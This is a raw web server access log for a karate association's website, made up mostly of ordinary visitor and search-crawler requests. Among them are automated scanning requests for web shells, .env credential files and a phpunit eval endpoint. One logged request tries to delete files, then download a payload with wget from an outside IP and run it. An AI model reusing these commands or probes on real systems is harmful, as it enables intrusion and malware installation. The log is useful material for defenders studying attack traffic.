::ffff:20.118.129.10 - - [22/Sep/2022:04:33:08 +0000] "GET /public/403.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:13 +0000] "GET /q.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:15 +0000] "GET /r.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:18 +0000] "GET /root.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:23 +0000] "GET /rss.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:27 +0000] "GET /s.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:30 +0000] "GET /sh.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:38 +0000] "GET /shell.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:43 +0000] "GET /shx.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:46 +0000] "GET /small.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:33:49 +0000] "GET /templates/beez5/index.php HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:03 +0000] "GET /u.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:05 +0000] "GET /up.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:08 +0000] "GET /uploader.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:10 +0000] "GET /uploads/up.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:15 +0000] "GET /v.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:22 +0000] "GET /vuln.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.118.129.10 - - [22/Sep/2022:04:34:24 +0000] "GET /w.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:04:37:06 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:157.55.39.21 - - [22/Sep/2022:04:41:33 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:98.60.239.35 - - [22/Sep/2022:04:44:27 +0000] "GET / HTTP/1.1" 200 58140 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:44:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:44:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:46:46 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 200 86185 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:46:47 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 304 - "https://www.google.com/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:64.233.172.172 - - [22/Sep/2022:04:47:36 +0000] "GET /.well-known/traffic-advice HTTP/1.1" 404 165 "-" "Chrome Privacy Preserving Prefetch Proxy"
::ffff:193.186.4.207 - - [22/Sep/2022:04:47:36 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:72.14.201.206 - - [22/Sep/2022:04:47:37 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:04:48:45 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:98.60.239.35 - - [22/Sep/2022:04:51:00 +0000] "GET / HTTP/1.1" 304 - "https://www.google.com/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:51:00 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.60.239.35 - - [22/Sep/2022:04:51:00 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:05:00:30 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:197.34.34.197 - - [22/Sep/2022:05:06:02 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:159.223.36.12 - - [22/Sep/2022:05:10:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:73.93.253.46 - - [22/Sep/2022:05:12:05 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:66.249.66.200 - - [22/Sep/2022:05:15:44 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.57 - - [22/Sep/2022:05:16:14 +0000] "GET /images/Naha-lineage.jpg HTTP/1.1" 200 212379 "-" "Googlebot-Image/1.0"
::ffff:37.139.53.86 - - [22/Sep/2022:05:22:46 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [22/Sep/2022:05:22:46 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [22/Sep/2022:05:22:47 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:135.125.246.189 - - [22/Sep/2022:05:24:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Sep/2022:05:24:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.228 - - [22/Sep/2022:05:26:42 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:216.244.66.196 - - [22/Sep/2022:05:43:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:37.139.53.81 - - [22/Sep/2022:05:43:23 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.81 - - [22/Sep/2022:05:43:24 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.81 - - [22/Sep/2022:05:43:25 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:216.244.66.196 - - [22/Sep/2022:05:45:19 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:66.249.66.200 - - [22/Sep/2022:05:45:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:73.93.253.46 - - [22/Sep/2022:05:53:34 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:194.32.120.131 - - [22/Sep/2022:05:56:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:194.32.120.131 - - [22/Sep/2022:05:56:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:194.32.120.131 - - [22/Sep/2022:05:56:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:194.32.120.131 - - [22/Sep/2022:05:56:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:194.32.120.131 - - [22/Sep/2022:05:56:43 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "python-requests/2.28.1"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:09 +0000] "GET /wp-admin/css/ HTTP/1.1" 404 152 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:15 +0000] "GET /.well-known/ HTTP/1.1" 404 151 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:21 +0000] "GET /sites/default/files/ HTTP/1.1" 404 159 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:28 +0000] "GET /admin/controller/extension/extension/ HTTP/1.1" 404 176 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:33 +0000] "GET /uploads/ HTTP/1.1" 404 147 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:48 +0000] "GET /images/ HTTP/1.1" 404 146 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.194.195.105 - - [22/Sep/2022:06:04:58 +0000] "GET /files/ HTTP/1.1" 404 145 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:06:05:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:114.119.147.2 - - [22/Sep/2022:06:14:57 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.net/joinemail?type=tournaments" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:73.93.253.46 - - [22/Sep/2022:06:16:54 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:40.77.167.46 - - [22/Sep/2022:06:18:02 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:45.79.171.66 - - [22/Sep/2022:06:27:00 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:73.93.253.46 - - [22/Sep/2022:06:28:34 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:73.93.253.46 - - [22/Sep/2022:06:40:14 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:94.102.61.10 - - [22/Sep/2022:06:45:42 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::ffff:66.249.66.52 - - [22/Sep/2022:06:45:44 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:192.241.220.30 - - [22/Sep/2022:06:47:28 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:73.93.253.46 - - [22/Sep/2022:06:51:54 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:5.255.231.126 - - [22/Sep/2022:06:52:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:87.250.224.49 - - [22/Sep/2022:06:52:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:87.250.224.49 - - [22/Sep/2022:06:52:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:87.250.224.49 - - [22/Sep/2022:06:52:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:87.250.224.49 - - [22/Sep/2022:06:52:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:5.255.231.126 - - [22/Sep/2022:06:52:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:87.250.224.49 - - [22/Sep/2022:06:52:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:5.255.231.126 - - [22/Sep/2022:06:52:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:207.46.13.202 - - [22/Sep/2022:06:56:46 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.244.48 - - [22/Sep/2022:06:57:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Sep/2022:06:57:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:108.175.2.82 - - [22/Sep/2022:06:58:32 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
::ffff:94.102.61.8 - - [22/Sep/2022:07:17:09 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:07:24:27 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:192.241.206.75 - - [22/Sep/2022:07:35:11 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:114.119.152.114 - - [22/Sep/2022:07:35:54 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.1" 200 766218 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:73.93.253.46 - - [22/Sep/2022:07:36:07 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:114.119.152.128 - - [22/Sep/2022:07:44:26 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.66.195 - - [22/Sep/2022:07:45:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.195 - - [22/Sep/2022:07:45:44 +0000] "GET /videos.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:162.62.191.231 - - [22/Sep/2022:07:48:02 +0000] "GET / HTTP/1.1" 200 58140 "-" "curl/7.64.1"
::ffff:209.141.41.193 - - [22/Sep/2022:07:48:08 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.41.193 - - [22/Sep/2022:07:48:09 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:114.119.152.114 - - [22/Sep/2022:07:49:38 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:37.139.53.86 - - [22/Sep/2022:07:51:48 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:37.139.53.86 - - [22/Sep/2022:07:51:48 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:37.139.53.86 - - [22/Sep/2022:07:51:49 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:114.119.152.119 - - [22/Sep/2022:07:54:51 +0000] "GET /events HTTP/1.1" 200 9083 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:37.139.53.81 - - [22/Sep/2022:07:56:22 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:37.139.53.81 - - [22/Sep/2022:07:56:23 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:37.139.53.81 - - [22/Sep/2022:07:56:23 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:07:59:27 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:114.119.152.108 - - [22/Sep/2022:08:00:05 +0000] "GET /contact HTTP/1.1" 200 10017 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.181.60.189 - - [22/Sep/2022:08:03:12 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
